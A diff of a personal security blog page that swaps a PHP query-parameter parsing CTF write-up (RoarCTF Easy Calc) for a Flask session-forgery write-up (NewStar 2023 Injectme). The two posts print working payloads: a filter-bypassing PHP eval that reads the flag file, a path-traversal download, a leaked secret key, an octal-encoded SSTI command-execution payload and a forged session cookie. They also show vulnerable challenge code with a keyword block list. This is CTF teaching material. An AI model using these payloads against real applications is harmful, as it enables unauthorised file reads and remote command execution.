@@ -13,28 +13,25 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/2024/10/13/php参数名解析特性/"/>
+    <link rel="canonical" href="http://example.com/2024/12/02/flask之session伪造/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1）删除空白符2）将某些字符转换为下划线（包括空格） 来看一张图 当PHP版本小于8时，如果参数中出现多次中括号[，只有第一个中括号会被转换成下划线_，其他的不变 当PHP版本等于8时，传入的参数名中非法字符一律全部转换为了下划线 来看看例题，[RoarCTF 2019]Easy Calc 访问&#x2F;calc.php，得到源">
+        <meta name="description" content="伪造session一定要密钥！！！也就是我们说的secret_key 工具flask解密法一：https:&#x2F;&#x2F;github.com&#x2F;noraj&#x2F;flask-session-cookie-manager  python flask_session_cookie_manager3.py decode -s “secret_key” -c “需要解密的session值” 法二： 123456789101">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php参数名解析特性">
-<meta property="og:url" content="http://example.com/2024/10/13/php%E5%8F%82%E6%95%B0%E5%90%8D%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:title" content="Flask之session伪造">
+<meta property="og:url" content="http://example.com/2024/12/02/Flask%E4%B9%8Bsession%E4%BC%AA%E9%80%A0/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1）删除空白符2）将某些字符转换为下划线（包括空格） 来看一张图 当PHP版本小于8时，如果参数中出现多次中括号[，只有第一个中括号会被转换成下划线_，其他的不变 当PHP版本等于8时，传入的参数名中非法字符一律全部转换为了下划线 来看看例题，[RoarCTF 2019]Easy Calc 访问&#x2F;calc.php，得到源">
+<meta property="og:description" content="伪造session一定要密钥！！！也就是我们说的secret_key 工具flask解密法一：https:&#x2F;&#x2F;github.com&#x2F;noraj&#x2F;flask-session-cookie-manager  python flask_session_cookie_manager3.py decode -s “secret_key” -c “需要解密的session值” 法二： 123456789101">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://pic1.zhimg.com/80/v2-0e34e9715c4ee0d6396e31c224de037c_1440w.webp">
-<meta property="og:image" content="https://picx.zhimg.com/80/v2-824efa32e71f6453e246ca558e42ce43_1440w.webp">
-<meta property="og:image" content="https://pic4.zhimg.com/80/v2-433c0b5d63a05f1e51c7fe2adecf6339_1440w.webp">
-<meta property="og:image" content="https://pica.zhimg.com/80/v2-eec56d7cd79d41449075ca37d36165dc_1440w.webp">
-<meta property="og:image" content="https://pic2.zhimg.com/80/v2-9e0b222fedc7bbe4c12d6a0219194aa7_1440w.webp">
-<meta property="article:published_time" content="2024-10-13T03:04:27.361Z">
-<meta property="article:modified_time" content="2024-10-13T03:07:04.869Z">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-d4fd0045fb15024dca27e0fff626bca0_1440w.webp">
+<meta property="og:image" content="https://pic1.zhimg.com/80/v2-c5e2d7f38802332ce67b3beaf48e20ec_1440w.webp">
+<meta property="article:published_time" content="2024-12-02T11:38:56.383Z">
+<meta property="article:modified_time" content="2024-12-02T11:37:44.378Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-0e34e9715c4ee0d6396e31c224de037c_1440w.webp">
+<meta name="twitter:image" content="https://pic1.zhimg.com/80/v2-d4fd0045fb15024dca27e0fff626bca0_1440w.webp">
     
     
     <!--- Icon Part-->
@@ -46,7 +43,7 @@
     
     <title>
         
-            php参数名解析特性 -
+            Flask之session伪造 -
         
         Saofe1a
     </title>
@@ -503,7 +500,7 @@
         <div class="article-title relative w-full">
             
                 <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">php参数名解析特性</h1>
+                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">Flask之session伪造</h1>
                 </div>
             
             </div>
@@ -522,15 +519,15 @@
                         <div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2024-10-13 11:04:27</span>
-        <span class="mobile">2024-10-13 11:04:27</span>
+        <span class="desktop">2024-12-02 19:38:56</span>
+        <span class="mobile">2024-12-02 19:38:56</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-10-13 11:07:04</span>
-            <span class="mobile">2024-10-13 11:07:04</span>
+            <span class="desktop">2024-12-02 19:37:44</span>
+            <span class="mobile">2024-12-02 19:37:44</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -541,12 +538,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>418 Words</span>
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>885 Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>1 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>4 Mins</span>
         </span>
     
     
@@ -565,44 +562,32 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：<br>1）删除空白符<br>2）将某些字符转换为下划线（包括空格）</p>
-<p>来看一张图<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic1.zhimg.com/80/v2-0e34e9715c4ee0d6396e31c224de037c_1440w.webp"
-                     
-                ></p>
-<p>当<code>PHP版本小于8</code>时，如果参数中出现多次中括号<code>[</code>，只有第一个中括号会被转换成下划线<code>_</code>，其他的不变</p>
-<p>当<code>PHP版本等于8</code>时，传入的参数名中非法字符一律全部转换为了下划线</p>
-<p>来看看例题，<code>[RoarCTF 2019]Easy Calc</code></p>
-<p>访问<code>/calc.php</code>，得到源码<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://picx.zhimg.com/80/v2-824efa32e71f6453e246ca558e42ce43_1440w.webp"
-                     
-                ><br>当num传递的为字母时，被waf拦截（另一个waf，不是上面PHP文件设置的黑名单）<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic4.zhimg.com/80/v2-433c0b5d63a05f1e51c7fe2adecf6339_1440w.webp"
-                     
-                ><br>这里就可以用到字符串解析特性了，对于这种get参数非常好用，在<code>num</code>前面加上<code>空格</code>或者<code>+号</code>，再测试一下就可以了<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pica.zhimg.com/80/v2-eec56d7cd79d41449075ca37d36165dc_1440w.webp"
-                     
-                ></p>
-<p>由于对<code>&#39;</code>单引号过滤，可以使用<code>chr()</code>函数绕过<br>这里尝试使用 <code>system(&#39;ls&#39;)</code> 获取目录时失败<br>用print_r(scandir(‘&#x2F;‘))<br><code>calc.php?%20num=print_r(scandir(chr(47)))</code><br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic2.zhimg.com/80/v2-9e0b222fedc7bbe4c12d6a0219194aa7_1440w.webp"
-                     
-                ></p>
-<p>payload:<code>calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p>
-<p>查看目录的PHP语句如下：</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;ls&#x27;); </span><br><span class="line">echo system(&#x27;ls&#x27;); </span><br><span class="line">eval(system(&#x27;ls&#x27;)); </span><br><span class="line">eval(&quot;echo system(&#x27;ls&#x27;);&quot;); </span><br><span class="line"> </span><br><span class="line">print_r(scandir(&#x27;.&#x27;)); </span><br><span class="line">echo print_r(scandir(&#x27;.&#x27;)); </span><br><span class="line">eval(print_r(scandir(&#x27;.&#x27;))); </span><br><span class="line">eval(&quot;print_r(scandir(&#x27;.&#x27;));&quot;); </span><br><span class="line">eval(&quot;echo print_r(scandir(&#x27;.&#x27;));&quot;); </span><br><span class="line"> </span><br><span class="line">var_dump(scandir(&#x27;.&#x27;)); </span><br><span class="line">echo var_dump(scandir(&#x27;.&#x27;)); </span><br><span class="line">eval(var_dump(scandir(&#x27;.&#x27;))); </span><br><span class="line">eval(&quot;var_dump(scandir(&#x27;.&#x27;));&quot;); </span><br><span class="line">eval(&quot;echo var_dump(scandir(&#x27;.&#x27;));&quot;); </span><br></pre></td></tr></table></figure></div>
+            <p>伪造session一定要密钥！！！也就是我们说的secret_key</p>
+<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="flask解密"><a href="#flask解密" class="headerlink" title="flask解密"></a>flask解密</h2><p>法一：<a class="link"   target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager" >https://github.com/noraj/flask-session-cookie-manager <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>python flask_session_cookie_manager3.py decode -s “secret_key” -c “需要解密的session值”</p>
+<p>法二：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(decryption(<span class="string">&quot;eyJ1c2VybmFtZSI6eyIgYiI6IlozVmxjM1E9In19.XyZ3Vw.OcD3-l1yOcq8vlg8g4Ww3FxrhVs&quot;</span>.encode()))</span><br></pre></td></tr></table></figure></div>
 
-<p>读取文件内容的PHP语句将上面的函数改为<code>file_get_contents()</code></p>
-<p>当对引号进行过滤时，可以使用<code>chr()</code>拼接的方式进行过滤</p>
+<h2 id="flask加密"><a href="#flask加密" class="headerlink" title="flask加密"></a>flask加密</h2><p>python flask_session_cookie_manager3.py encode -s “secret_key” -t “需要加密的session值”</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>Newstar2023 Injectme</p>
+<p>在110.jpg中我们看到了部分源码<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic1.zhimg.com/80/v2-d4fd0045fb15024dca27e0fff626bca0_1440w.webp"
+                     
+                ><br>可以看到是个下载文件的代码，在download路由下，但对文件名有过滤，过滤了..&#x2F;，直接双写绕过，根据经验猜测一下文件名，然后一层一层往上找即可，payload：&#x2F;download&#x2F;?file&#x3D;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;app&#x2F;app.py，拿到源码</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string  </span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key  </span><br><span class="line">  </span><br><span class="line">app = Flask(__name__)  </span><br><span class="line">app.secret_key = secret_key  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here  </span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/cancanneed&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cancanneed</span>():  </span><br><span class="line">    all_filename = os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>)  </span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> filename:  </span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">str</span>(os.listdir(<span class="string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():  </span><br><span class="line">    filename = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">    <span class="keyword">if</span> filename:  </span><br><span class="line">        filename = filename.replace(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">        filename = os.path.join(<span class="string">&#x27;static/img/&#x27;</span>, filename)  </span><br><span class="line">        <span class="built_in">print</span>(filename)  </span><br><span class="line">        <span class="keyword">if</span> (os.path.exists(filename)) <span class="keyword">and</span> (<span class="string">&quot;start&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> filename):  </span><br><span class="line">            <span class="keyword">return</span> send_file(filename)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            abort(<span class="number">500</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        abort(<span class="number">404</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backdoor&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))  </span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span>  </span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)  </span><br><span class="line">        <span class="keyword">if</span> re.findall(  </span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,  </span><br><span class="line">                name):  </span><br><span class="line">            abort(<span class="number">500</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="keyword">return</span> render_template_string(  </span><br><span class="line">                <span class="string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)  </span><br><span class="line">    <span class="keyword">except</span> Exception:  </span><br><span class="line">        abort(<span class="number">500</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_find</span>(<span class="params">e</span>):  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)  </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):  </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure></div>
+<p>源码开头看到secret_key是从config文件中导入，backdoor函数这里又需要让session的值可控，session伪造无疑了，然后禁用了一大堆ssti函数，肯定是要打ssti了</p>
+<p>下载config文件：download&#x2F;?file&#x3D;…&#x2F;.&#x2F;…&#x2F;.&#x2F;…&#x2F;.&#x2F;app&#x2F;config.py</p>
+<p>拿到secret_key &#x3D; “y0u_n3ver_k0nw_s3cret_key_1s_newst4r”</p>
+<p>session解密后发现是{‘user’: ‘guest’}，我们要把guest换成ssti的语句</p>
+<p>ssti这里过滤了好多东西，直接八进制编码绕过即可<br><code>x|attr(&quot;&quot;\\137\\137\\151\\156\\151\\164\\137\\137&quot;&quot;)|attr(&quot;&quot;\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137&quot;&quot;)|attr(&quot;&quot;\\137\\137\\147\\145\\164\\151\\164\\145\\155\\137\\137&quot;&quot;)|attr(&quot;&quot;\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137&quot;&quot;)|attr(&quot;&quot;\\137\\137\\147\\145\\164\\151\\164\\145\\155\\137\\137&quot;&quot;)|attr(&quot;&quot;\\145\\166\\141\\154&quot;&quot;)(&quot;&quot;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\042\\157\\163\\042\\051\\056\\160\\157\\160\\145\\156\\050\\042\\143\\141\\164\\040\\057\\052\\042\\051\\056\\162\\145\\141\\144\\050\\051&quot;&quot;)</code></p>
+<p>伪造后的session：.eJy1kD0OwjAMhe9iqVK7uYltJM6ShYGBBaFSpEqld6d26v7QDiwsVhK_9_k5Pbye1wbO0BeP5nZvy67r3pe2bcoEKdXx5IVrLeInoVUXqkMLmU-FbNegpfY3iT8SiH3eMtnemDeEnVnnCc_ZaYOxVf6UIatlte4-XQ5hQvQfkvD9swl57KKtkiVxuqICMG-xAHDOJRsvRQ-jeCRtsOHDAS84xRxEjholUFXFAMMHKM2ZMA.ZVd5wg.NN4PVUmSQiA6Ll-XV1SkJq_5b50<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://pic1.zhimg.com/80/v2-c5e2d7f38802332ce67b3beaf48e20ec_1440w.webp"
+                     
+                ></p>
 
         </div>
 
@@ -610,18 +595,18 @@
             <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                 <div class="article-copyright-info-container">
     <ul>
-        <li><strong>Title:</strong> php参数名解析特性</li>
+        <li><strong>Title:</strong> Flask之session伪造</li>
         <li><strong>Author:</strong> Saofe1a</li>
         <li><strong>Created at
-                :</strong> 2024-10-13 11:04:27</li>
+                :</strong> 2024-12-02 19:38:56</li>
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-10-13 11:07:04
+                    :</strong> 2024-12-02 19:37:44
             </li>
         
         <li>
-            <strong>Link:</strong> https://saofeia.github.io/2024/10/13/php参数名解析特性/
+            <strong>Link:</strong> https://saofeia.github.io/2024/12/02/Flask之session伪造/
         </li>
         <li>
             <strong>
@@ -646,29 +631,14 @@
         
             <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                 
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/2024/10/17/Flask%E8%AE%A1%E7%AE%97pin%E7%A0%81/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Flask计算pin码</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
                 
                     <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                         <a class="next"
                         rel="next"
-                        href="/2024/10/10/Thinkphp5.1%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ajax%E9%93%BE/"
+                        href="/2024/10/17/Flask%E8%AE%A1%E7%AE%97pin%E7%A0%81/"
                         >
                             <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">Thinkphp5.1 反序列化ajax链</span>
+                                <span class="post-nav-title-item">Flask计算pin码</span>
                                 <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex justify-center items-center">
@@ -732,8 +702,8 @@
             <div class="post-toc-wrap">
     <div class="post-toc">
         <div class="toc-title">On this page</div>
-        <div class="page-title">php参数名解析特性</div>
-        
+        <div class="page-title">Flask之session伪造</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-text">工具</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#flask%E8%A7%A3%E5%AF%86"><span class="nav-text">flask解密</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask%E5%8A%A0%E5%AF%86"><span class="nav-text">flask加密</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-text">例题</span></a></li></ol>
 
     </div>
 </div>
